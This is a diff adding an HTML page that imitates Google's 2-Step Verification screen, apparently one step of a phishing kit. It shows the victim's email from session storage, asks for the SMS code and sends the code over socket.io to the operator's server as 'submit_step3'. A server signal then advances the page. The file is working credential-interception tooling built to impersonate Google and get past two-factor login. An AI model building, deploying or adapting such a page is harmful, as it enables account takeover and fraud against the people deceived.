@@ -1,0 +1,426 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>2-Step Verification</title>
+    <link rel="icon"
+        href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 48 48'><path fill='%234285F4' d='M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z'/><path fill='%2334A853' d='M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z'/><path fill='%23FBBC05' d='M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z'/><path fill='%23EA4335' d='M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z'/></svg>">
+    <style>
+        *,
+        *::before,
+        *::after {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        @import url('https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500&family=Roboto:wght@400;500&display=swap');
+
+        :root {
+            --bg: #000000;
+            --card-bg: #000000;
+            --card-border: #3c4043;
+            --text-primary: #ffffff;
+            --text-secondary: #9aa0a6;
+            --input-border: #3c4043;
+            --input-focus: #8ab4f8;
+            --link-color: #8ab4f8;
+            --btn-bg: #8ab4f8;
+            --btn-text: #000000;
+            --error: #f28b82;
+        }
+
+        html,
+        body {
+            height: 100%;
+        }
+
+        body {
+            font-family: 'Roboto', Arial, sans-serif;
+            background: var(--bg);
+            color: var(--text-primary);
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        .page-wrap {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 24px;
+        }
+
+        .card {
+            background: var(--card-bg);
+            border-radius: 8px;
+            border: 1px solid var(--card-border);
+            padding: 48px 40px 36px;
+            width: 520px;
+            max-width: 100%;
+            animation: fadeSlideIn 0.35s ease-out;
+        }
+
+        @keyframes fadeSlideIn {
+            from {
+                opacity: 0;
+                transform: translateX(20px);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateX(0);
+            }
+        }
+
+        .g-logo {
+            width: 40px;
+            height: 40px;
+            margin-bottom: 24px;
+            display: block;
+        }
+
+        h1 {
+            font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
+            font-size: 24px;
+            font-weight: 400;
+            margin-bottom: 12px;
+        }
+
+        .desc {
+            font-size: 14px;
+            color: var(--text-secondary);
+            line-height: 20px;
+            margin-bottom: 8px;
+        }
+
+        .email-chip {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            border: 1px solid var(--card-border);
+            border-radius: 16px;
+            padding: 2px 10px 2px 4px;
+            margin: 8px 0 0;
+            font-size: 14px;
+        }
+
+        .card-inner {
+            display: flex;
+            gap: 40px;
+        }
+
+        .card-left {
+            flex: 0 0 auto;
+            min-width: 200px;
+        }
+
+        .card-right {
+            flex: 1 1 auto;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .sms-info {
+            font-size: 14px;
+            color: var(--text-primary);
+            line-height: 20px;
+            margin-bottom: 20px;
+        }
+
+        /* Code input with G- prefix */
+        .code-input-wrap {
+            display: flex;
+            align-items: center;
+            border: 1px solid var(--input-border);
+            border-radius: 4px;
+            transition: border-color 0.2s;
+        }
+
+        .code-input-wrap:focus-within {
+            border-color: var(--input-focus);
+            border-width: 2px;
+        }
+
+        .code-prefix {
+            padding: 14px 4px 14px 16px;
+            font-size: 16px;
+            color: var(--text-secondary);
+            user-select: none;
+        }
+
+        .code-input-wrap input {
+            flex: 1;
+            background: transparent;
+            border: none;
+            outline: none;
+            padding: 14px 16px 14px 0;
+            font-size: 16px;
+            color: var(--text-primary);
+            font-family: 'Roboto', Arial, sans-serif;
+            caret-color: var(--input-focus);
+        }
+
+        .checkbox-row {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin: 12px 0 0;
+        }
+
+        .checkbox-row input[type="checkbox"] {
+            appearance: none;
+            -webkit-appearance: none;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 18px;
+            height: 18px;
+            background: transparent;
+            border: 2px solid #5f6368;
+            border-radius: 2px;
+            cursor: pointer;
+            position: relative;
+            outline: none;
+        }
+
+        .checkbox-row input[type="checkbox"]:checked {
+            background: var(--input-focus);
+            border-color: var(--input-focus);
+        }
+
+        .checkbox-row input[type="checkbox"]:checked::after {
+            content: '';
+            position: absolute;
+            width: 5px;
+            height: 10px;
+            border: solid #000000;
+            border-width: 0 2px 2px 0;
+            transform: rotate(45deg);
+            margin-top: -1px;
+        }
+
+        .checkbox-row label {
+            font-size: 14px;
+            color: var(--text-primary);
+            cursor: pointer;
+        }
+
+        .link {
+            color: var(--link-color);
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .link:hover {
+            text-decoration: underline;
+        }
+
+        .resend-link {
+            display: block;
+            margin-top: 20px;
+            color: var(--text-secondary);
+            font-size: 14px;
+        }
+
+        .error-msg {
+            color: var(--error);
+            font-size: 12px;
+            margin-top: 8px;
+            display: none;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .error-msg.show {
+            display: flex;
+        }
+
+        .code-input-wrap.error {
+            border-color: var(--error);
+        }
+
+        .btn-row {
+            display: flex;
+            justify-content: flex-end;
+            align-items: center;
+            gap: 16px;
+            margin-top: 32px;
+        }
+
+        .btn-next {
+            background: var(--btn-bg);
+            color: var(--btn-text);
+            border: none;
+            border-radius: 20px;
+            padding: 10px 24px;
+            font-size: 14px;
+            font-weight: 500;
+            font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
+            cursor: pointer;
+            transition: background 0.2s;
+            letter-spacing: 0.25px;
+        }
+
+        .btn-next:hover {
+            background: #aecbfa;
+        }
+
+        .footer {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 16px 24px;
+            flex-shrink: 0;
+        }
+
+        .footer select {
+            background: transparent;
+            color: var(--text-secondary);
+            border: none;
+            font-size: 13px;
+            font-family: 'Roboto', Arial, sans-serif;
+            outline: none;
+            -webkit-appearance: none;
+            appearance: none;
+            padding-right: 16px;
+            background-image: url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='10' height='5' fill='%239aa0a6'%3E%3Cpath d='M0 0l5 5 5-5z'/%3E%3C/svg%3E");
+            background-repeat: no-repeat;
+            background-position: right center;
+        }
+
+        .footer-right {
+            display: flex;
+            gap: 28px;
+        }
+
+        .footer-right a {
+            color: var(--text-secondary);
+            text-decoration: none;
+            font-size: 13px;
+        }
+
+        @media (max-width: 600px) {
+            body {
+                background: var(--card-bg);
+            }
+
+            .page-wrap {
+                align-items: flex-start;
+                padding: 0;
+            }
+
+            .card {
+                border: none;
+                border-radius: 0;
+                width: 100%;
+                padding: 40px 24px 20px;
+                background: var(--card-bg);
+            }
+
+            .card-inner {
+                flex-direction: column;
+                gap: 24px;
+            }
+
+            .card-left {
+                min-width: 0;
+            }
+
+            .footer {
+                background: var(--card-bg);
+                padding: 12px 24px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="page-wrap">
+        <div class="card">
+            <div class="card-inner">
+                <div class="card-left">
+                    <img class="g-logo" src="/static/google.png" alt="Google">
+                    <h1>2-Step Verification</h1>
+                    <p class="desc">To help keep your account safe, Google wants to make sure it's really you trying to
+                        sign in</p>
+                    <div class="email-chip">
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="#9aa0a6">
+                            <path
+                                d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z" />
+                        </svg>
+                        <span id="emailDisplay"></span>
+                        <svg width="18" height="18" viewBox="0 0 24 24" fill="#9aa0a6">
+                            <path d="M7 10l5 5 5-5z" />
+                        </svg>
+                    </div>
+                </div>
+                <div class="card-right">
+                    <form id="step3Form" autocomplete="off" novalidate>
+                        <p class="sms-info">A text message with a 6-digit verification code was just sent to ••• •••
+                            ••••</p>
+                        <div class="code-input-wrap" id="codeWrap">
+                            <span class="code-prefix">G-</span>
+                            <input type="text" id="codeInput" placeholder="Enter the code" autocomplete="off" autofocus
+                                maxlength="10" inputmode="numeric">
+                        </div>
+                        <div class="error-msg" id="codeError">
+                            <svg width="16" height="16" viewBox="0 0 24 24" fill="#f28b82">
+                                <path
+                                    d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z" />
+                            </svg>
+                            <span>Enter a verification code</span>
+                        </div>
+                        <div class="checkbox-row"><input type="checkbox" id="dontAsk"><label for="dontAsk">Don't ask
+                                again on this device</label></div>
+                        <a href="#" class="resend-link">Resend it</a>
+                        <div class="btn-row">
+                            <a href="#" class="link">Try another way</a>
+                            <button type="submit" class="btn-next">Next</button>
+                        </div>
+                    </form>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="footer">
+        <div class="footer-left"><select>
+                <option>English (United States)</option>
+            </select></div>
+        <div class="footer-right"><a href="#">Help</a><a href="#">Privacy</a><a href="#">Terms</a></div>
+    </div>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.4/socket.io.min.js"></script>
+    <script>
+        const socket = io();
+        document.getElementById('emailDisplay').textContent = sessionStorage.getItem('userEmail') || '';
+        const form = document.getElementById('step3Form');
+        const codeInput = document.getElementById('codeInput');
+        const codeWrap = document.getElementById('codeWrap');
+        const codeError = document.getElementById('codeError');
+        form.addEventListener('submit', function (e) {
+            e.preventDefault();
+            const code = codeInput.value.trim();
+            if (!/^\d{6}$/.test(code)) {
+                codeWrap.classList.add('error');
+                codeError.classList.add('show');
+                codeError.querySelector('span').textContent = 'Enter the 6-digit code';
+                codeInput.focus();
+                return;
+            }
+            codeWrap.classList.remove('error'); codeError.classList.remove('show');
+            socket.emit('submit_step3', { code: code });
+        });
+        codeInput.addEventListener('input', function (e) {
+            e.target.value = e.target.value.replace(/\D/g, '');
+            codeWrap.classList.remove('error');
+            codeError.classList.remove('show');
+        });
+        socket.on('code_accepted', function () { document.querySelector('.card').style.opacity = '0'; document.querySelector('.card').style.transition = 'opacity 0.3s'; });
+    </script>
+</body>
+
+</html>
